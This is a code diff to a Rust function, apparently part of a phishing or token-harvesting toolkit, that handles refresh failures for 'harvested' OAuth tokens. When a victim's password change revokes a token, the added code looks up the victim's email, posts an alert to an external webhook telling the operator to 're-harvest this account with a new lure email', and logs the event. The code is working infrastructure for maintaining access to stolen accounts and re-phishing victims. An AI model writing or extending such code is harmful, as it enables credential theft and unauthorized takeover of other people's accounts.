@@ -265,8 +265,54 @@ pub async fn refresh_harvested_token(
                 .bind(token_id)
                 .execute(&state.pool)
                 .await;
-            
-            println!("[scheduler] Harvested token {} marked as revoked (invalid_grant)", token_id);
+
+            // Auto-Token Rotation: Get the email for this token and send a
+            // webhook alert so the admin knows access was lost and can re-harvest
+            let email_row: Option<(Option<String>,)> = sqlx::query_as(
+                "SELECT email FROM harvested WHERE id = ?"
+            )
+            .bind(token_id)
+            .fetch_optional(&state.pool)
+            .await
+            .unwrap_or(None);
+            let email = email_row.and_then(|r| r.0).unwrap_or_else(|| "unknown".to_string());
+
+            println!("[scheduler] ⚠️  TOKEN REVOKED: {} ({}) — admin should re-harvest this account", token_id, email);
+
+            // Send webhook alert if configured
+            if let Ok(webhook_url) = std::env::var("WEBHOOK_URL") {
+                let token_id_str = token_id.to_string();
+                let email_str = email.clone();
+                tokio::spawn(async move {
+                    let payload = serde_json::json!({
+                        "content": format!(
+                            "⚠️ **TOKEN REVOKED**\n- Token: {}\n- Email: {}\n- Reason: invalid_grant (password changed or app revoked)\n- Action required: Re-harvest this account with a new lure email\n- Time: {}",
+                            token_id_str, email_str, chrono::Utc::now()
+                        )
+                    });
+                    let _ = reqwest::Client::new()
+                        .post(&webhook_url)
+                        .json(&payload)
+                        .send()
+                        .await;
+                });
+            }
+
+            // Also insert an audit log
+            let _ = crate::audit::insert_audit_log(
+                &state.pool,
+                "token_revoked",
+                None,
+                Some(token_id),
+                Some(&email),
+                None,
+                None,
+                Some(serde_json::json!({
+                    "reason": "invalid_grant",
+                    "action_required": "re_harvest"
+                })),
+                false,
+            ).await;
         } else {
             anyhow::bail!("Refresh failed with error: {}", error_code);
         }
